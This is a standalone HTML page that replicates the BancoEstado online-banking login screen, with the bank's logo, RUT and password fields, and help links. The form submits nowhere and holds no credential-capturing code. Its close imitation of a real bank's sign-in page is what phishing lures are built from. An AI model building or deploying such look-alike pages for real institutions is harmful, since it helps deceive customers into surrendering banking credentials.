<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
  <title>BancoEstado - Banca en Línea</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 420px;
      background: #ffffff;
      border-radius: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
      overflow: hidden;
      position: relative;
    }

    /* Header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 24px 10px;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .logo-svg {
      width: 36px;
      height: 36px;
      flex-shrink: 0;
    }

    .logo-text {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      letter-spacing: -0.5px;
    }

    .close-btn {
      width: 32px;
      height: 32px;
      border-radius: 50%;
      background: #f0f2f5;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      font-size: 18px;
      color: #555;
    }

    /* Content */
    .content {
      padding: 10px 28px 30px;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      color: #1a1a1a;
      margin-bottom: 28px;
      line-height: 1.3;
    }

    .form-group {
      margin-bottom: 22px;
    }

    .form-group label {
      display: block;
      font-size: 14px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 8px;
    }

    .input-wrapper {
      position: relative;
    }

    .form-group input {
      width: 100%;
      height: 48px;
      padding: 0 16px;
      border: 1px solid #d0d5dd;
      border-radius: 8px;
      font-size: 15px;
      color: #1a1a1a;
      outline: none;
      transition: border-color 0.2s;
    }

    .form-group input:focus {
      border-color: #0057b8;
    }

    .form-group input::placeholder {
      color: #98a2b3;
    }

    /* Password eye icon */
    .toggle-password {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
      display: flex;
      align-items: center;
      color: #667085;
    }

    .toggle-password svg {
      width: 22px;
      height: 22px;
    }

    /* Botón Ingresar */
    .btn-primary {
      width: 100%;
      height: 52px;
      background: #0057b8;
      color: white;
      border: none;
      border-radius: 50px;
      font-size: 17px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 8px;
      margin-bottom: 20px;
      transition: background 0.2s;
    }

    .btn-primary:hover {
      background: #004494;
    }

    /* Link problemas */
    .link-problemas {
      display: block;
      text-align: center;
      color: #0057b8;
      font-size: 15px;
      text-decoration: underline;
      margin-bottom: 24px;
    }

    /* Divider */
    .divider {
      height: 1px;
      background: #e4e7ec;
      margin-bottom: 24px;
    }

    /* Botón Acceso Empresas */
    .btn-secondary {
      width: 100%;
      height: 52px;
      background: white;
      color: #0057b8;
      border: 1.5px solid #0057b8;
      border-radius: 50px;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-bottom: 28px;
      transition: background 0.2s;
    }

    .btn-secondary:hover {
      background: #f0f7ff;
    }

    /* Ayuda */
    .help-section {
      text-align: center;
    }

    .help-title {
      font-size: 15px;
      font-weight: 600;
      color: #1a1a1a;
      margin-bottom: 6px;
    }

    .help-text {
      font-size: 14px;
      color: #667085;
      line-height: 1.4;
    }

    .help-text a {
      color: #0057b8;
      text-decoration: underline;
    }

    /* Botón recargar flotante (opcional) */
    .reload-btn {
      position: absolute;
      bottom: 20px;
      right: 20px;
      width: 48px;
      height: 48px;
      border-radius: 12px;
      background: white;
      border: 1px solid #e4e7ec;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      color: #0057b8;
    }

    .reload-btn svg {
      width: 24px;
      height: 24px;
    }
  </style>
</head>
<body>

  <div class="container">
    <!-- Header -->
    <div class="header">
      <div class="logo">
        <!-- Logo BancoEstado (ícono oficial) -->
        <svg class="logo-svg" viewBox="0 0 31.09 31.09" xmlns="http://www.w3.org/2000/svg">
          <rect fill="#fff" width="31.09" height="31.09"/>
          <path fill="#d70032" d="M.74,15.63,11.29,11V7.65h0a14,14,0,0,0,8.5-4.75h0l10.56,8.62V.74H.74Z"/>
          <path fill="#fff" d="M11.31,25.41h8.48V2.91h0A14,14,0,0,1,11.3,7.65h0V11L.74,15.63v3.31L11.3,14.31V11l3.39-1.48V12.8l-3.38,1.5v3.24l3.39-1.48v3.23l-3.39,1.49V17.54L.74,22.17v3.24l10.57-4.63Z"/>
          <polygon fill="#ee801d" points="11.31 17.54 11.31 17.54 11.31 14.3 11.3 14.31 11.3 14.31 0.74 18.94 0.74 22.18 11.31 17.54 11.31 17.54"/>
          <polygon fill="#ee801d" points="11.31 20.78 0.74 25.41 0.74 25.41 11.31 25.41 11.31 20.78"/>
          <polygon fill="#ee801d" points="11.31 14.3 14.69 12.83 14.69 9.56 11.3 11.05 11.3 14.31 11.31 14.3 11.31 14.3"/>
          <polygon fill="#ff6b00" points="11.31 14.3 11.31 14.3 11.3 14.31 11.3 14.31 11.31 14.3"/>
          <polygon fill="#ee801d" points="11.31 17.54 11.31 20.78 14.7 19.29 14.7 16.06 11.31 17.54 11.31 17.54 11.31 17.54"/>
          <polygon fill="#ee801d" points="19.8 25.41 30.35 25.41 30.35 11.53 19.79 2.91 19.8 25.41"/>
          <polygon fill="#ff6b00" points="19.79 25.41 19.8 25.41 19.79 2.91 19.79 25.41"/>
          <polygon fill="#074c96" points="0.74 30.34 30.35 30.34 30.35 30.34 0.74 30.34"/>
          <polygon fill="#0257a0" points="19.8 25.41 19.79 25.41 11.31 25.41 0.74 25.41 0.74 30.34 30.35 30.34 30.35 25.41 19.8 25.41"/>
        </svg>
        <span class="logo-text">BancoEstado</span>
      </div>
      <button class="close-btn">✕</button>
    </div>

    <!-- Contenido -->
    <div class="content">
      <h1 class="title">Ingresa a tu Banca en Línea</h1>

      <form>
        <!-- RUT -->
        <div class="form-group">
          <label for="rut">RUT</label>
          <div class="input-wrapper">
            <input type="text" id="rut" placeholder="Ej: 12345678k" autocomplete="username">
          </div>
        </div>

        <!-- Clave -->
        <div class="form-group">
          <label for="clave">Clave</label>
          <div class="input-wrapper">
            <input type="password" id="clave" placeholder="********" autocomplete="current-password">
            <button type="button" class="toggle-password" onclick="togglePassword()" aria-label="Mostrar contraseña">
              <!-- Ícono de ojo (SVG) -->
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
                <circle cx="12" cy="12" r="3"/>
              </svg>
            </button>
          </div>
        </div>

        <!-- Botón Ingresar -->
        <button type="submit" class="btn-primary">Ingresar</button>
      </form>

      <!-- Problemas con la clave -->
      <a href="#" class="link-problemas">¿Problemas con tu Clave?</a>

      <div class="divider"></div>

      <!-- Acceso Empresas -->
      <button class="btn-secondary">Acceso Empresas</button>

      <!-- Ayuda -->
      <div class="help-section">
        <p class="help-title">¿Necesitas ayuda?</p>
        <p class="help-text">
          Para aclarar dudas revisa nuestro 
          <a href="#">Centro de ayuda</a>
        </p>
      </div>
    </div>

    <!-- Botón recargar (opcional) -->
    <button class="reload-btn" aria-label="Recargar">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <polyline points="23 4 23 10 17 10"/>
        <polyline points="1 20 1 14 7 14"/>
        <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
      </svg>
    </button>
  </div>

  <script>
    function togglePassword() {
      const input = document.getElementById('clave');
      input.type = input.type === 'password' ? 'text' : 'password';
    }
  </script>
</body>
</html>
